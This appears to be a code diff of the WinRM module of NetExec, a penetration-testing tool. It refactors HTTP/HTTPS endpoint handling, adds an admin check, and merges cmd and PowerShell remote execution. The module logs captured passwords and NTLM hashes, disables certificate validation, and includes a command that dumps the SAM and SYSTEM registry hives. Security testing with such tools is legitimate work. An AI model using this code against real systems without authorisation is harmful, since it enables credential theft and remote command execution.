@@ -2,9 +2,12 @@ import binascii
 import hashlib
 import os
 import requests
+import urllib3
+import xml.etree.ElementTree as ET
 
 from io import StringIO
 from datetime import datetime
+from pypsrp.wsman import NAMESPACES
 from pypsrp.client import Client
 
 from impacket.smbconnection import SMBConnection
@@ -18,16 +21,18 @@ from nxc.logger import NXCAdapter
 import contextlib
 
 
+urllib3.disable_warnings()
+
 class winrm(connection):
     def __init__(self, args, db, host):
         self.domain = None
         self.server_os = None
         self.output_filename = None
         self.endpoint = None
-        self.port = None
         self.hash = None
         self.lmhash = None
         self.nthash = None
+        self.ssl = False
 
         connection.__init__(self, args, db, host)
 
@@ -36,7 +41,7 @@ class winrm(connection):
             extra={
                 "protocol": "WINRM",
                 "host": self.host,
-                "port": self.args.port if self.args.port else 5985,
+                "port": self.port,
                 "hostname": self.hostname,
             }
         )
@@ -170,12 +175,14 @@ class winrm(connection):
 
     def print_host_info(self):
         if self.args.domain:
-            self.logger.extra["protocol"] = "HTTP"
+            self.logger.extra["protocol"] = "HTTPS" if self.ssl else "HTTP"
             self.logger.display(self.endpoint)
         else:
             self.logger.extra["protocol"] = "SMB"
+            self.logger.extra["port"] = "445"
             self.logger.display(f"{self.server_os} (name:{self.hostname}) (domain:{self.domain})")
-            self.logger.extra["protocol"] = "HTTP"
+            self.logger.extra["protocol"] = "HTTPS" if self.ssl else "HTTP"
+            self.logger.extra["port"] = self.port
             self.logger.display(self.endpoint)
 
         if self.args.laps:
@@ -183,21 +190,41 @@ class winrm(connection):
         return True
 
     def create_conn_obj(self):
-        endpoints = [
-            f"https://{self.host}:{self.args.port if self.args.port else 5986}/wsman",
-            f"http://{self.host}:{self.args.port if self.args.port else 5985}/wsman",
-        ]
+        if self.is_link_local_ipv6:
+            self.logger.info("winrm not support link-local ipv6, exitting...")
+            return
+        endpoints = {
+            "HTTP":{
+                "protocol":"http", 
+                "port":self.port[0],
+                "ssl":False
+            },
+            "HTTPS":{
+                "protocol":"https", 
+                "port":self.port[1] if len(self.port) != 1 else self.port[0],
+                "ssl":True
+            }
+        }
 
-        for url in endpoints:
+        if self.args.check_proto == "https":
+            endpoints.pop("HTTP")
+        elif self.args.check_proto == "http":
+            endpoints.pop("HTTPS")
+
+        for protocol in endpoints.keys():
+            self.port = endpoints[protocol]["port"]
+            url = "{}://{}:{}/wsman".format(
+                endpoints[protocol]["protocol"],
+                self.host if not self.is_ipv6 else f"[{self.host}]",
+                self.port
+            )
             try:
                 self.logger.debug(f"Requesting URL: {url}")
                 res = requests.post(url, verify=False, timeout=self.args.http_timeout) 
                 self.logger.debug(f"Received response code: {res.status_code}")
                 self.endpoint = url
-                if self.endpoint.startswith("https://"):
-                    self.logger.extra["port"] = self.args.port if self.args.port else 5986
-                else:
-                    self.logger.extra["port"] = self.args.port if self.args.port else 5985
+                self.ssl = endpoints[protocol]["ssl"]
+                self.logger.extra["port"] = self.port
                 return True
             except requests.exceptions.Timeout as e:
                 self.logger.info(f"Connection Timed out to WinRM service: {e}")
@@ -207,8 +234,23 @@ class winrm(connection):
                 else:
                     self.logger.info(f"Other ConnectionError to WinRM service: {e}")
         return False
+    
+    def check_if_admin(self):
+        wsman = self.conn.__getstate__()["wsman"]
+        wsen = NAMESPACES["wsen"]
+        wsmn = NAMESPACES["wsman"]
+
+        enum_msg = ET.Element(f"{{{wsen}}}Enumerate")
+        ET.SubElement(enum_msg, f"{{{wsmn}}}OptimizeEnumeration")
+        ET.SubElement(enum_msg, f"{{{wsmn}}}MaxElements").text = "32000"
+
+        response = wsman.enumerate("http://schemas.microsoft.com/wbem/wsman/1/windows/shell", enum_msg)
+        shells = response.findall("wsen:EnumerateResponse/wsman:Items/rsp:Shell", NAMESPACES)
+        self.admin_privs = True
+        return True
 
     def plaintext_login(self, domain, username, password):
+        self.admin_privs = False
         try:
             if not self.args.laps:
                 self.password = password
@@ -219,14 +261,11 @@ class winrm(connection):
                 auth="ntlm",
                 username=f"{domain}\\{self.username}",
                 password=self.password,
-                ssl=bool(self.args.ssl),
-                cert_validation=not self.args.ignore_ssl_cert,
+                ssl=self.ssl,
+                cert_validation=False,
             )
 
-            # TO DO: right now we're just running the hostname command to make the winrm library auth to the server
-            # we could just authenticate without running a command :) (probably)
-            self.conn.execute_ps("hostname")
-            self.admin_privs = True
+            self.check_if_admin()
             self.logger.success(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")
 
             self.logger.debug(f"Adding credential: {domain}/{self.username}:{self.password}")
@@ -244,11 +283,12 @@ class winrm(connection):
             if "with ntlm" in str(e):
                 self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()}")
             else:
-                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()} '{e}'")
+                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(self.password)} {self.mark_pwned()} ({str(e)})")
 
             return False
 
     def hash_login(self, domain, username, ntlm_hash):
+        self.admin_privs = False
         try:
             lmhash = "00000000000000000000000000000000:"
             nthash = ""
@@ -274,14 +314,11 @@ class winrm(connection):
                 auth="ntlm",
                 username=f"{self.domain}\\{self.username}",
                 password=lmhash + nthash,
-                ssl=bool(self.args.ssl),
-                cert_validation=not self.args.ignore_ssl_cert,
+                ssl=self.ssl,
+                cert_validation=False,
             )
 
-            # TO DO: right now we're just running the hostname command to make the winrm library auth to the server
-            # we could just authenticate without running a command :) (probably)
-            self.conn.execute_ps("hostname")
-            self.admin_privs = True
+            self.check_if_admin()
             self.logger.success(f"{self.domain}\\{self.username}:{process_secret(nthash)} {self.mark_pwned()}")
             self.db.add_credential("hash", domain, self.username, nthash)
 
@@ -296,31 +333,38 @@ class winrm(connection):
             if "with ntlm" in str(e):
                 self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(nthash)}")
             else:
-                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(nthash)} '{e}'")
+                self.logger.fail(f"{self.domain}\\{self.username}:{process_secret(nthash)} ({str(e)})")
             return False
 
-    def execute(self, payload=None, get_output=False):
-        try:
-            self.logger.debug(f"Connection: {self.conn}, and type: {type(self.conn)}")
-            r = self.conn.execute_cmd(self.args.execute, encoding=self.args.codec)
-            self.logger.success("Executed command")
-            buf = StringIO(r[0]).readlines()
-            for line in buf:
-                self.logger.highlight(line.strip())
-        except Exception as e:
-            self.logger.debug(f"Error executing command: {e}")
-            self.logger.fail("Cannot execute command, probably because user is not local admin, but running via powershell (-X) may work")
+    def execute(self, payload=None, get_output=True, shell_type="cmd"):
+        if not payload:
+            payload = self.args.execute
 
-    def ps_execute(self, payload=None, get_output=False):
+        if self.args.no_output:
+            get_output = False
+
         try:
-            r = self.conn.execute_ps(self.args.ps_execute)
-            self.logger.success("Executed command")
-            buf = StringIO(r[0]).readlines()
+            result = self.conn.execute_cmd(payload, encoding=self.args.codec) if shell_type == "cmd" else self.conn.execute_ps(payload)
+        except Exception as e:
+            # Reference: https://github.com/diyan/pywinrm/issues/275
+            if hasattr(e, "code") and e.code == 5:
+                self.logger.fail(f"Execute command failed, current user: '{self.domain}\\{self.username}' has no 'Invoke' rights to execute command (shell type: {shell_type})")
+                
+                if shell_type == "cmd":
+                    self.logger.info("Cannot execute command, probably has not invoke rights with Root WinRM listener, now auto switch to PSSession!")
+                    self.execute(payload, get_output, shell_type="powershell")
+            elif ("decode" in str(e)) and not get_output:
+                self.logger.success(f"Executed command (shell type: {shell_type})")
+            else:
+                self.logger.fail(f"Execute command failed, error: {str(e)}")
+        else:
+            self.logger.success(f"Executed command (shell type: {shell_type})")
+            buf = StringIO(result[0]).readlines() if get_output else ""
             for line in buf:
                 self.logger.highlight(line.strip())
-        except Exception as e:
-            self.logger.debug(f"Error executing command: {e}")
-            self.logger.fail("Command execution failed")
+
+    def ps_execute(self):
+        self.execute(payload=self.args.ps_execute, get_output=True, shell_type="powershell")
 
     def sam(self):
         self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
